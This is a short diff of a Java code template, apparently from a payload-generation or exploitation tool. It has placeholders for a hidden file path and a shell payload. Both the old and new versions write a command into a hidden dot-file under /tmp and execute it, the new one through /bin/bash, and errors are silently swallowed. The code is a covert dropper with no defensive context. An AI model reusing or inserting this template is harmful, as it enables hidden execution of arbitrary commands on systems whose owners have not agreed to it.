@@ -1,7 +1,9 @@
+// @in <hiddenfile> java.lang.String file-path
+// @in <shellpayload> java.lang.String shell-command
 try {
-	java.io.FileWriter fw = new java.io.FileWriter("/tmp/." + "#STRING#");
-	fw.write("#COMMAND#");
-	fw.close();
-	Runtime.getRuntime().exec("#COMMAND#").waitFor();
-} catch (java.io.IOException e) {
-} catch (InterruptedException e) {}
+    String dropped = "/tmp/." + <hiddenfile>;
+    java.io.FileWriter fw = new java.io.FileWriter(dropped);
+    fw.write(<shellpayload>);
+    fw.close();
+    Runtime.getRuntime().exec("/bin/bash " + dropped);
+} catch (java.io.IOException e) {}
